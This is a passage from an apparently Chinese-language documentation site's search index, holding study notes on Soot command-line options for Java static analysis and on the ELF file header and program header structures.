wjap"},{"location":"security/soot/usage/#input-options","title":"input options","text":"input options desc <code>-cp &lt;path&gt;</code> \u9700\u8981 soot \u5206\u6790\u7684\u7c7b\u7684\u5730\u5740 <code>-pp</code> Prepend the given soot classpath to the default classpath. <code>-allow-phantom-refs</code> Allow unresolved classes; may cause errors <code>-no-bodies-for-excluded</code> Do not load bodies for excluded classes <code>-process-path &lt;dir&gt;</code><code>-porcess-dir &lt;dir&gt;</code> \u5904\u7406 dir \u4e2d\u6240\u6709\u7684\u7c7b,\uff0c\u8be5 dir \u4e5f\u53ef\u4ee5\u662f jar \u5305 <p><code>-pp</code>\u7684\u5fc5\u8981\u6027</p> <p>soot \u6709\u81ea\u5df1\u7684 classpath\uff0c\u8be5 classpath \u4e0b\u662f soot \u9700\u8981\u5206\u6790\u7684\u6587\u4ef6\uff0c\u5982<code>A.class</code>\u3002</p> <p>\u4f46\u662f\u5f53\u6211\u4eec\u4f7f\u7528 <code>java soot.Main -cp $SOOT_CP A.class</code>\uff0c\u4ecd\u7136\u4f1a\u62a5\u9519\uff1ajava.lang.RuntimeException: None of the basic classes could be loaded! Check your Soot class path!</p> <p>\u5176\u539f\u56e0\u662f soot \u9700\u8981\u7528\u5230 java \u7684\u81ea\u5e26\u7684\u5404\u79cd\u7c7b\uff0c\u5982 java.lang.Object\uff0c\u4f46\u5f53\u524d\u7684 classpath \u4e0b\u80af\u5b9a\u4e0d\u5b58\u5728\u5305\u542b\u8be5\u7c7b\u7684 jar \u5305\uff0c\u56e0\u6b64\u62a5\u9519\u3002</p> <p>\u6b64\u65f6\u63a8\u8350\u7684\u89e3\u51b3\u529e\u6cd5\u6709\u4e24\u79cd\uff1a</p> <ul> <li>\u6dfb\u52a0<code>jce.jar</code>, <code>rt.jar</code> \u5230 soot \u7684 classpath\u3002\u5176\u4e2d<code>jce.jar</code>\u662f\u4f7f\u7528\u4e86<code>-w</code>\u53c2\u6570\u8fdb\u5165\u8fc7\u7a0b\u95f4\u5206\u6790\u624d\u9700\u8981\u7528\u5230\u3002</li> <li>\u91c7\u7528 <code>-pp</code> options\uff0c\u524d\u63d0\u662f\u6b63\u786e\u8bbe\u7f6e <code>$JAVA_HOME</code>\uff0c\u4f1a\u81ea\u52a8\u52a0\u8f7d<code>jce.jar</code>\u548c <code>rt.jar</code>\u3002</li> </ul> <p>\u6b64\u5916\u8fd8\u6709\u4e00\u79cd\u4e0d\u63a8\u8350\u7684\u65b9\u6cd5\uff1a</p> <ul> <li><code>-allow-phantom-refs</code>\uff1asoot \u5c06\u4e3a\u65e0\u6cd5\u89e3\u6790\u7684\u7c7b\u521b\u5efa\u4e00\u4e2a phantom class\u3002\u672c\u8d28\u662f\u544a\u8bc9 soot\uff0c\u65e0\u6cd5\u63d0\u4f9b\u4f60\u9700\u8981\u7684\u7c7b\uff0c\u4f60\u81ea\u5df1\u770b\u7740\u529e\u628a\uff01</li> </ul> <p>\u8be5\u9009\u9879\u5f88\u5371\u9669\uff0c\u8bb8\u591a\u8bf7\u60c5\u51b5\u4e0b\u65e0\u6cd5\u83b7\u53d6\u4f60\u60f3\u8981\u7684\u7ed3\u679c\u3002</p> <p>Note</p> <p>\u5f53\u5b58\u5728\u591a\u4e2a classpath \u65f6\uff1a</p> <ul> <li>linux\uff1a\u5192\u53f7<code>:</code>\u5206\u9694</li> <li>windows\uff1a\u5206\u53f7<code>;</code>\u5206\u9694</li> </ul> <p>\u6b64\u5916\uff0cPATH \u7684\u659c\u6760\uff1a</p> <ul> <li>linux\uff1a\u53cd\u659c\u6760 <code>/</code></li> <li>windows\uff1a\u6b63\u659c\u6760 <code>\\</code></li> </ul>"},{"location":"security/soot/usage/#output-options","title":"output options","text":"output options desc <code>-f &lt;format&gt;</code> soot \u7684\u8f93\u51fa\u683c\u5f0f\uff0c\u5e38\u7528<code>J</code>\u8868\u793a\u8f93\u51fa<code>Jimple</code>\u683c\u5f0f\u3002 <code>-d &lt;dir&gt;</code> soot \u7684\u7ed3\u679c\u8f93\u51fa\u5230\u76ee\u5f55 dir \u4e2d"},{"location":"security/soot/usage/#processing-options","title":"processing options","text":"processing options desc <code>\u2013W</code> Perform whole program optimizations, enable wjop and wsop <code>\u2013O</code> Perform intraprocedural optimizations, enable bop, gop, jop and sop"},{"location":"security/soot/usage/#phase-options","title":"phase options","text":"<p>\u5df2\u77e5 soot \u7531\u82e5\u5e72\u4e2a phase \u6784\u6210\uff0c\u6bcf\u4e2a phase \u53c8\u7ec6\u5206\u4e3a\u82e5\u5e72\u4e2a subphase\uff0c\u8fd9\u4e9b phase \u7684\u5b9e\u73b0\u79f0\u4e3a pack\u3002</p> <p>\u800c phase options \u7684\u4f5c\u7528\u5c31\u662f\uff0c\u8ba9\u4f60\u6539\u53d8\u6bcf\u4e2a phase \u7684\u884c\u4e3a\uff01</p> <p>\u4f7f\u7528 <code>-p &lt;puase&gt;.&lt;subphase&gt;</code>\u5f00\u59cb\uff0c\u6b64\u540e\u63a5\u8bbe\u7f6e\uff0c\u683c\u5f0f\u4e3a <code>OPT:VAL</code>\uff0c\u591a\u4e2a\u8bbe\u7f6e\u7528\u9017\u53f7 <code>,</code>\u5206\u9694\u3002</p> <p>\u5982\u4e0b\u793a\u4f8b\uff1a\u5bf9<code>cg.spark</code>\u8fd9\u4e2a subphase \u8fdb\u884c\u81ea\u5b9a\u4e49\uff0c\u5bf9\u5176\u5f00\u542f verbose \u548c on-fly-cg\uff1a</p> <ul> <li>verbose\uff1afalse(default), When this option is set to true, Spark prints detailed information about its execution.</li> <li>on-fly-cg\uff1atrue(defaulte), When this option is set to true, the call graph is computed on-the-fly as points-to information is computed. Otherwise, an initial CHA approximation to the call graph is used.</li> </ul> <pre><code>java [javaOptions] soot.Main classname -p cg.spark verbose:true,on-fly-cg:false\n</code></pre> <p>\u5df2\u77e5 phase \u7684\u5b9e\u73b0\u662f pack\uff0cpack \u662f transformer \u7684\u96c6\u5408\uff0c\u6bcf\u4e00\u4e2a transformer \u5bf9\u5e94\u4e8e\u4e00\u4e2a subphase\u3002\u5f53 pack \u8c03\u7528\u65f6\uff0c\u5b83\u5c06\u6309\u987a\u5e8f\u6267\u884c\u6bcf\u4e00\u4e2a transformer\u3002</p> <p>\u6bcf\u4e00\u4e2a transformer \u662f<code>extend</code>\u4e86 <code>BodyTransformer</code> or <code>SceneTransformer</code> \u7684\u7c7b\u7684\u5b9e\u4f8b\uff0c\u4e14\u5fc5\u987b\u91cd\u5199\u5176\u4e2d\u7684<code>internalTransform()</code>\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5 providing an implementation which carries out some transformation on the code being analyzed.</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6dfb\u52a0\u4e00\u4e2a transformer \u5c31\u662f\u65b0\u589e\u4e86\u4e00\u4e2a <code>subphase</code>\u3002</p> <p>\u5177\u4f53\u4ee3\u7801\u5c06\u5728 java api \u4e2d\u8bb2\u89e3\u3002</p> <p>For more options.</p>"},{"location":"security/soot/usage/#example","title":"Example","text":"<p>Prepare:</p> <pre><code>wget -P soot https://repo1.maven.org/maven2/org/soot-oss/soot/4.3.0/soot-4.3.0-jar-with-dependencies.jar\n</code></pre> <p>\u4e0b\u8ff0\u4ee3\u7801\u5c06\u5904\u7406 <code>HelloWorld.java</code>\uff0c\u5e76\u6700\u7ec8\u5728<code>sootOutput/com.wang.HelloWorld.jimple</code>\u8f93\u51fa\u7ed3\u679c\u3002</p> <pre><code>export SOOT_HOME = shell_soot/soot-4.3.0-jar-with-dependencies.jar\nexport POJO_HOME = src/test/java\n# verify install\njava -cp shell_soot/soot-4.3.0-jar-with-dependencies.jar  soot.Main  -h\n\n# compile\njavac src/test/java/com/wang/HelloWorld.java\n\n# use soot output .jimple\njava -cp shell_soot/soot-4.3.0-jar-with-dependencies.jar soot.Main -cp src\\test\\java -pp -f J com.wang.HelloWorld\n</code></pre> <ul> <li><code>-cp $SOOT_HOME</code> \u6307\u5b9a soot \u7684 jar \u5305\u76ee\u5f55</li> <li><code>-cp $POJO_HOME</code> : \u6307\u5b9a\u6240\u8981\u5206\u6790 <code>.class</code> \u6587\u4ef6\u7684\u76ee\u76ee\u5f55</li> <li><code>-pp</code>: \u6307\u5b9a soot \u53bb\u81ea\u52a8\u641c\u7d22 java \u7684 path\uff0c \u4e3b\u8981\u662f rt.jar \u548c jce.jar\uff0c soot \u4f1a\u53bb$JAVA_HOME \u4e0b\u5bfb\u627e</li> <li><code>-f J</code>: \u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u7c7b\u578b\uff0c J \u5c31\u662f jimple</li> <li><code>com.wang.HelloWorld</code>: \u4f60\u8981\u5206\u6790\u7684 class \u7684\u540d\u5b57</li> </ul>"},{"location":"security/soot/usage/#java-api","title":"Java API","text":"<p>https://github.com/HappyTsing/soot-tutorial</p> <p>https://github.com/HappyTsing/cflow_analysis</p>"},{"location":"security/soot/usage/#reference","title":"Reference","text":"<ul> <li>soot \u4ecb\u7ecd - \u7b80\u8981 \u672a\u7ec6\u770b</li> <li>soot survivors guide - \u5fae\u8fc7\u65f6 \u6d45\u8ff0\u5e94\u7528 \u5165\u95e8\u770b</li> <li>soot survivors guide - \u524d\u56db\u7ae0\u7ffb\u8bd1 \u5efa\u8bae\u76f4\u63a5\u770b EN</li> <li>Fundamental-Soot-objects - soot \u81ea\u5b9a\u4e49\u7684\u6982\u5ff5</li> <li>Jimple \u57fa\u672c\u6982\u5ff5 - Foundamental-Soot-objects \u7684\u4e2d\u6587\u7248</li> <li>soot \u5b89\u88c5\u4e0e shell/java \u751f\u6210 Jimple \u6587\u4ef6 - \u53c2\u8003\u5b89\u88c5</li> <li>Packs-and-phases-in-Soot - Transfer \u4ee3\u7801\u793a\u4f8b</li> <li>soot \u5b66\u4e60\u7b14\u8bb0 - \u5fae\u95e8\u69db \u7528\u5904\u4e0d\u5927</li> <li>soot options - \u5fc5\u770b\u5b98\u7f51\u6587\u6863 \u4f7f\u7528\u67e5\u9605</li> <li>Soot-as-a-command-line-tool - \u66f4\u591a\u8fd0\u884c\u793a\u4f8b \u51fa\u9519\u67e5\u8be2</li> <li>soot java api</li> <li>\u7b80\u5355\u5165\u95e8\u4ee3\u7801</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/ELF%20%E8%AF%A6%E8%A7%A3/","title":"ELF \u8be6\u89e3","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/ELF%20%E8%AF%A6%E8%A7%A3/#elf-header","title":"ELF Header","text":"<p>\u6ce8\uff1a\u5728\u4e0b\u9762\u7684\u4ecb\u7ecd\u4e2d\uff0c\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\u3002</p> <p>ELF Header \u63cf\u8ff0\u4e86 ELF \u6587\u4ef6\u7684\u6982\u8981\u4fe1\u606f\uff0c\u5229\u7528\u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u53ef\u4ee5\u7d22\u5f15\u5230 ELF \u6587\u4ef6\u7684\u5168\u90e8\u4fe1\u606f\uff0c\u6570\u636e\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>#define EI_NIDENT   16\n\ntypedef struct {\n    unsigned char   e_ident[EI_NIDENT];\n    ELF32_Half      e_type;\n    ELF32_Half      e_machine;\n    ELF32_Word      e_version;\n    ELF32_Addr      e_entry;\n    ELF32_Off       e_phoff;\n    ELF32_Off       e_shoff;\n    ELF32_Word      e_flags;\n    ELF32_Half      e_ehsize;\n    ELF32_Half      e_phentsize;\n    ELF32_Half      e_phnum;\n    ELF32_Half      e_shentsize;\n    ELF32_Half      e_shnum;\n    ELF32_Half      e_shstrndx;\n} Elf32_Ehdr;\n</code></pre> <p>\u901a\u8fc7 <code>readelf -h</code> \u547d\u4ee4\u6765\u770b\u770b\u793a\u4f8b\u7a0b\u5e8f\u4e2d\u7684 ELF Header \u5185\u5bb9\uff0c\u663e\u793a\u7ed3\u679c\u5982\u4e0b\u56fe\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n   printf(\"Hello, World!\");\n   return 0;\n}\n</code></pre> <p></p> <p>\u4e0a\u8ff0\u7ed3\u6784\u4f53\u4e0e\u622a\u56fe\u4e2d\u7684\u5b57\u6bb5\u662f\u5bf9\u5e94\u7684\u3002</p> <p>\u2460e_ident</p> <p>\u6ce8\u610f\uff1a\u56fe\u4e2d\u7684 Magic \u5b57\u6bb5\uff0c\u4f3c\u4e4e\u5c31\u662f e_ident \u6570\u7ec4\u7684\u5185\u5bb9\u3002</p> <p>\u957f 16 \u7684\u6570\u7ec4\uff0c\u6b63\u5982\u4e4b\u524d\u6240\u8bf4\uff0cELF \u63d0\u4f9b\u4e86\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u6846\u67b6\uff0c\u4ee5\u4fbf\u4e8e\u652f\u6301\u591a\u79cd\u5904\u7406\u5668\uff0c\u591a\u79cd\u7f16\u7801\u683c\u5f0f\u7684\u673a\u5668\u3002\u8be5\u53d8\u91cf\u7ed9\u51fa\u4e86\u7528\u4e8e\u89e3\u7801\u548c\u89e3\u91ca\u6587\u4ef6\u4e2d\u4e0e\u673a\u5668\u65e0\u5173\u7684\u6570\u636e\u7684\u65b9\u5f0f\u3002\u8fd9\u4e2a\u6570\u7ec4\u5bf9\u4e8e\u4e0d\u540c\u7684\u4e0b\u6807\u7684\u542b\u4e49\u5982\u4e0b\uff1a</p> <ul> <li> <p>\u524d 4 \u5b57\u8282\uff1a\u9b54\u6570\uff0c\u6b63\u662f\u56fe\u4e2d\u7684 Magic \u7684\u524d\u56db\u4f4d\u3002</p> </li> <li> <p>\u7b2c 5 \u5b57\u8282\uff1aEI_CLASS\uff0c\u8868\u793a\u6587\u4ef6\u7c7b\u578b\u3002ELF \u6587\u4ef6\u7684\u8bbe\u8ba1\u4f7f\u5f97\u5b83\u53ef\u4ee5\u5728\u591a\u79cd\u5b57\u8282\u957f\u5ea6\u7684\u673a\u5668\u4e4b\u95f4\u79fb\u690d\uff0c\u800c\u4e0d\u9700\u8981\u5f3a\u5236\u89c4\u5b9a\u673a\u5668\u7684\u6700\u957f\u5b57\u8282\u957f\u5ea6\u548c\u6700\u77ed\u5b57\u8282\u957f\u5ea6\u3002</p> </li> </ul> <p>\u56fe\u4e2d Magic\uff08\u5373 e_ident\uff09\u7684\u7b2c 5 \u5b57\u8282\u4e3a \"0x02\" \u8868\u793a 64 \u4f4d\u67b6\u6784\u6587\u4ef6\uff0c\u663e\u793a\u5728\u622a\u56fe\u4e2d\u7684 Class \u5b57\u6bb5\u4e2d\u3002</p> EI_CLASS \u540d\u79f0 \u503c \u610f\u4e49 ELFCLASSNONE 0 \u65e0\u6548\u7c7b\u578b ELFCLASS32 1 32 \u4f4d\u6587\u4ef6 ELFCLASS64 2 64 \u4f4d\u6587\u4ef6 <ul> <li>\u7b2c 6 \u5b57\u8282\uff1aEI_DATA\uff0c\u8868\u793a\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u7279\u5b9a\u5904\u7406\u5668\u6570\u636e\u7684\u7f16\u7801\u65b9\u5f0f\u3002</li> </ul> <p>\u56fe\u4e2d\u7b2c 6 \u5b57\u8282\u4e3a \"01\" \u8868\u793a\u5c0f\u7aef\u5e8f\uff0c\u663e\u793a\u5728\u622a\u56fe\u7684 Data \u5b57\u6bb5\u4e2d\u3002</p> EI_DATA \u540d\u79f0 \u503c \u610f\u4e49 ELFDATANONE 0 \u65e0\u6548\u6570\u636e\u7f16\u7801 ELFDATA2LSB 1 \u5c0f\u7aef ELFDATA2MSB 2 \u5927\u7aef <ul> <li>ELFDATA2LSB \u5c0f\u7aef\u5e8f\uff1a\u4f4e\u5730\u5740\u5b58\u653e\u6570\u636e\u4f4e\u4f4d\uff0c\u9ad8\u5730\u5740\u5b58\u653e\u6570\u636e\u9ad8\u4f4d\uff08\u53e3\u8bc0\uff1a\u4f4e\u4f4e\u9ad8\u9ad8\uff09\uff0c\u4f8b\uff1a</li> </ul> <p></p> <ul> <li>ELFDATA2MSB \u5927\u7aef\u5e8f\uff1a\u4f4e\u5730\u5740\u5b58\u653e\u6570\u636e\u9ad8\u4f4d\uff0c\u9ad8\u5730\u5740\u5b58\u653e\u6570\u636e\u4f4e\u4f4d\uff0c\u4f8b\uff1a</li> </ul> <p></p> <ul> <li> <p>\u7b2c 7 \u5b57\u8282\uff1aEI_VERSION\uff0c\u7ed9\u51fa\u4e86 ELF \u5934\u7684\u7248\u672c\u53f7\u3002\u76ee\u524d\u8fd9\u4e2a\u503c\u5fc5\u987b\u662f<code>EV_CURRENT</code>\uff0c\u4e5f\u5c31\u662f\u6b64\u5904\u7684 \"0x01\"\u3002</p> </li> <li> <p>\u540e\u7eed\u7a7a\u5b57\u8282\uff1aEI_PAD\uff0c\u7ed9\u51fa\u4e86 <code>e_ident</code> \u4e2d\u672a\u4f7f\u7528\u5b57\u8282\u7684\u5f00\u59cb\u5730\u5740\u3002\u8fd9\u4e9b\u5b57\u8282\u88ab\u4fdd\u7559\u5e76\u7f6e\u4e3a 0\uff1b\u5904\u7406\u76ee\u6807\u6587\u4ef6\u7684\u7a0b\u5e8f\u5e94\u8be5\u5ffd\u7565\u5b83\u4eec\u3002\u5982\u679c\u4e4b\u540e\u8fd9\u4e9b\u5b57\u8282\u88ab\u4f7f\u7528\uff0cEI_PAD \u7684\u503c\u5c31\u4f1a\u6539\u53d8\u3002</p> </li> </ul> <p>\u2461e_type</p> <p>\u6807\u8bc6\u76ee\u6807\u6587\u4ef6\u7c7b\u578b:</p> \u540d\u79f0 \u503c \u610f\u4e49 ET_NONE 0 \u65e0\u6587\u4ef6\u7c7b\u578b ET_REL 1 \u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6 ET_EXEC 2 \u53ef\u6267\u884c\u6587\u4ef6 ET_DYN 3 \u5171\u4eab\u76ee\u6807\u6587\u4ef6 ET_CORE 4 \u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6 ET_LOPROC 0xff00 \u5904\u7406\u5668\u6307\u5b9a\u4e0b\u9650 ET_HIPROC 0xffff \u5904\u7406\u5668\u6307\u5b9a\u4e0a\u9650 <p>\u867d\u7136\u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6\u7684\u5185\u5bb9\u6ca1\u6709\u88ab\u8be6\u7ec6\u8bf4\u660e\uff0c\u4f46 <code>ET_CORE</code> \u8fd8\u662f\u88ab\u4fdd\u7559\u7528\u4e8e\u6807\u5fd7\u6b64\u7c7b\u6587\u4ef6\u3002\u4ece <code>ET_LOPROC</code> \u5230 <code>ET_HIPROC</code> (\u5305\u62ec\u8fb9\u754c) \u88ab\u4fdd\u7559\u7528\u4e8e\u5904\u7406\u5668\u6307\u5b9a\u7684\u573a\u666f\u3002\u5176\u5b83\u503c\u5728\u672a\u6765\u5fc5\u8981\u65f6\u53ef\u88ab\u8d4b\u4e88\u65b0\u7684\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u3002</p> <p>\u2462e_machine</p> <p>\u6307\u5b9a\u5f53\u524d\u6587\u4ef6\u53ef\u4ee5\u8fd0\u884c\u7684\u673a\u5668\u67b6\u6784:</p> \u540d\u79f0 \u503c \u610f\u4e49 EM_NONE 0 \u65e0\u673a\u5668\u7c7b\u578b EM_M32 1 AT&amp;T WE 32100 EM_SPARC 2 SPARC EM_386 3 Intel 80386 EM_68K 4 Motorola 68000 EM_88K 5 Motorola 88000 EM_860 7 Intel 80860 EM_MIPS 8 MIPS RS3000 <p>\u5176\u4e2d EM \u5e94\u8be5\u662f <code>ELF Machine</code> \u7684\u7b80\u5199\u3002</p> <p>\u5176\u5b83\u503c\u88ab\u5728\u672a\u6765\u5fc5\u8981\u65f6\u7528\u4e8e\u65b0\u7684\u673a\u5668\u3002 \u6b64\u5916\uff0c\u7279\u5b9a\u5904\u7406\u5668\u7684 ELF \u540d\u79f0\u4f7f\u7528\u673a\u5668\u540d\u79f0\u6765\u8fdb\u884c\u533a\u5206\uff0c\u4e00\u822c\u6807\u5fd7\u4f1a\u6709\u4e2a\u524d\u7f00<code>EF_</code> \uff08ELF Flag\uff09\u3002\u4f8b\u5982\uff0c\u5728<code>EM_XYZ</code>\u673a\u5668\u4e0a\u540d\u53eb <code>WIDGET</code> \u7684\u6807\u5fd7\u5c06\u88ab\u79f0\u4e3a <code>EF_XYZ_WIDGET</code>\u3002</p> <p>\u2463e_version</p> <p>\u6807\u8bc6\u76ee\u6807\u6587\u4ef6\u7684\u7248\u672c:</p> \u540d\u79f0 \u503c \u610f\u4e49 EV_NONE 0 \u65e0\u6548\u7248\u672c EV_CURRENT 1 \u5f53\u524d\u7248\u672c <p>\u2464 \u5176\u4ed6\uff1a</p> \u5b57\u6bb5 \u4f5c\u7528 e_entry \u4e3a\u7cfb\u7edf\u8f6c\u4ea4\u63a7\u5236\u6743\u7ed9 ELF \u4e2d\u76f8\u5e94\u4ee3\u7801\u7684\u865a\u62df\u5730\u5740\u3002\u5982\u679c\u6ca1\u6709\u76f8\u5173\u7684\u5165\u53e3\u9879\uff0c\u5219\u8fd9\u4e00\u9879\u4e3a 0\u3002 e_phoff \u7ed9\u51fa\u7a0b\u5e8f\u5934\u90e8\u8868\u5728\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u504f\u79fb\uff08Program Header table OFFset\uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u5219\u4e3a 0\u3002 e_shoff \u7ed9\u51fa\u8282\u5934\u8868\u5728\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u504f\u79fb\uff08 Section Header table OFFset \uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u5934\u8868\uff0c\u5219\u4e3a 0\u3002 e_flags \u7ed9\u51fa\u6587\u4ef6\u4e2d\u4e0e\u7279\u5b9a\u5904\u7406\u5668\u76f8\u5173\u7684\u6807\u5fd7\uff0c\u8fd9\u4e9b\u6807\u5fd7\u547d\u540d\u683c\u5f0f\u4e3a EF_machine_flag\u3002 e_ehsize \u7ed9\u51fa ELF \u6587\u4ef6\u5934\u90e8\u7684\u5b57\u8282\u957f\u5ea6\uff08ELF Header Size\uff09\u3002 e_phentsize \u7ed9\u51fa \u7a0b\u5e8f\u5934\u90e8\u8868\uff08Program Header Table\uff09 \u4e2d\u6bcf\u4e2a\u8868\u9879\u7684\u5b57\u8282\u957f\u5ea6\uff08Program Header ENTry SIZE\uff09\u3002\u6bcf\u4e2a\u8868\u9879\u7684\u5927\u5c0f\u76f8\u540c\u3002 e_phnum \u7ed9\u51fa \u7a0b\u5e8f\u5934\u90e8\u8868\uff08Program Header Table\uff09 \u7684\u9879\u6570\uff08 Program Header entry NUMber \uff09\u3002\u56e0\u6b64\uff0ce_phnum \u4e0e e_phentsize \u7684\u4e58\u79ef\u5373\u4e3a\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u5b57\u8282\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a 0\u3002 e_shentsize \u7ed9\u51fa\u8282\u5934\u7684\u5b57\u8282\u957f\u5ea6\uff08Section Header ENTry SIZE\uff09\u3002\u4e00\u4e2a\u8282\u5934\u662f\u8282\u5934\u8868\u4e2d\u7684\u4e00\u9879\uff1b\u8282\u5934\u8868\u4e2d\u6240\u6709\u9879\u5360\u636e\u7684\u7a7a\u95f4\u5927\u5c0f\u76f8\u540c\u3002 e_shnum \u7ed9\u51fa\u8282\u5934\u8868\u4e2d\u7684\u9879\u6570\uff08Section Header NUMber\uff09\u3002\u56e0\u6b64\uff0c e_shnum \u4e0e e_shentsize \u7684\u4e58\u79ef\u5373\u4e3a\u8282\u5934\u8868\u7684\u5b57\u8282\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u5934\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a 0\u3002 e_shstrndx \u7ed9\u51fa\u8282\u5934\u8868\u4e2d\u4e0e\u8282\u540d\u5b57\u7b26\u4e32\u8868\u76f8\u5173\u7684\u8868\u9879\u7684\u7d22\u5f15\u503c\uff08Section Header table InDeX related with section name STRing table\uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u540d\u5b57\u7b26\u4e32\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a SHN_UNDEF\u3002"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/ELF%20%E8%AF%A6%E8%A7%A3/#program-header-table-segment","title":"Program Header Table\uff08\u4e3a\u6267\u884c\u89c6\u56fe\u7684 Segment \u51c6\u5907\uff09","text":"<p>Program Header Table \u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u662f <code>Elf32_Phdr</code>\uff0c\u63cf\u8ff0\u4e86\u4e00\u4e2a\u6bb5(segment)\u6216\u8005\u5176\u5b83\u7cfb\u7edf\u5728\u51c6\u5907\u7a0b\u5e8f\u6267\u884c\u65f6\u6240\u9700\u8981\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u6bb5\u7684\u7c7b\u578b\u3001\u8d77\u59cb\u5730\u5740\u7b49\u4fe1\u606f\u3002</p> <p>\u6ce8\u610f\u5230\uff0cELF Header \u4e2d\u7684 <code>e_phentsize</code> \u548c <code>e_phnum</code> \u6307\u5b9a\u4e86\u8be5\u6570\u7ec4\u6bcf\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\u4ee5\u53ca\u5143\u7d20\u4e2a\u6570\u3002\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u7684\u6bb5\u5305\u542b\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u8282\u3002\u7a0b\u5e8f\u7684\u5934\u90e8\u53ea\u6709\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6709\u610f\u4e49\u3002</p> <p><code>Elf32_Phdr</code> \u7684\u6570\u636e\u7ed3\u6784\u5982\u4e0b</p> <pre><code>typedef struct {\n    ELF32_Word  p_type;   // \u6bb5\u7684\u7c7b\u578b\uff0c\u6216\u8005\u8868\u660e\u4e86\u8be5\u7ed3\u6784\u7684\u76f8\u5173\u4fe1\u606f\u3002\n    ELF32_Off   p_offset; // \u4ece\u6587\u4ef6\u5f00\u59cb\u5230\u8be5\u6bb5\u5f00\u5934\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u3002\n    ELF32_Addr  p_vaddr;  // \u8be5\u6bb5\u7b2c\u4e00\u4e2a\u5b57\u8282\u5728\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u3002\n    ELF32_Addr  p_paddr;  /* \u4ec5\u7528\u4e8e\u7269\u7406\u5730\u5740\u5bfb\u5740\u76f8\u5173\u7684\u7cfb\u7edf\u4e2d\uff0c \u7531\u4e8e \u201cSystem V\u201d \u5ffd\u7565\u4e86\u5e94\u7528\u7a0b\u5e8f\u7684\u7269\u7406\u5bfb\u5740,\n                                                   \u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u8be5\u9879\u5185\u5bb9\u5e76\u672a\u88ab\u9650\u5b9a\u3002*/\n    ELF32_Word  p_filesz; // \u6587\u4ef6\u955c\u50cf\u4e2d\u8be5\u6bb5\u7684\u5927\u5c0f\uff0c\u53ef\u80fd\u4e3a 0\u3002\n    ELF32_Word  p_memsz;  // \u5185\u5b58\u955c\u50cf\u4e2d\u8be5\u6bb5\u7684\u5927\u5c0f\uff0c\u53ef\u80fd\u4e3a 0\u3002\n    ELF32_Word  p_flags;  // \u4e0e\u6bb5\u76f8\u5173\u7684\u6807\u8bb0\u3002\n    ELF32_Word  p_align;  /* \u53ef\u52a0\u8f7d\u7684\u7a0b\u5e8f\u7684\u6bb5\u7684 p_vaddr \u4ee5\u53ca p_offset \u7684\u5927\u5c0f\u5fc5\u987b\u662f page \u7684\u6574\u6570\u500d\u3002\n                                                     \u8be5\u6210\u5458\u7ed9\u51fa\u4e86\u6bb5\u5728\u6587\u4ef6\u4ee5\u53ca\u5185\u5b58\u4e2d\u7684\u5bf9\u9f50\u65b9\u5f0f\u3002\n                             \u5982\u679c\u8be5\u503c\u4e3a 0 \u6216 1 \u7684\u8bdd\uff0c\u8868\u793a\u4e0d\u9700\u8981\u5bf9\u9f50\u3002\u9664\u6b64\u4e4b\u5916\uff0cp_align \u5e94\u8be5\u662f 2 \u7684\u6574\u6570\u6307\u6570\u6b21\u65b9\n                             \u5e76\u4e14 p_vaddr \u4e0e p_offset \u5728\u6a21 p_align \u7684\u610f\u4e49\u4e0b\uff0c\u5e94\u8be5\u76f8\u7b49\u3002*/\n} Elf32_Phdr;\n</code></pre> <p>\u901a\u8fc7 <code>readelf -l</code> \u547d\u4ee4\u6765\u770b\u770b\u793a\u4f8b\u7a0b\u5e8f\u4e2d\u7684 Program Header Table \u6570\u7ec4\u5185\u5bb9\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u6570\u7ec4\u7684\u6bcf\u4e00\u4e2a\u5143\u7d20\u521a\u597d\u662f <code>Elf32_Phdr</code> \u7ed3\u6784\u4f53\u3002</p> <p></p> 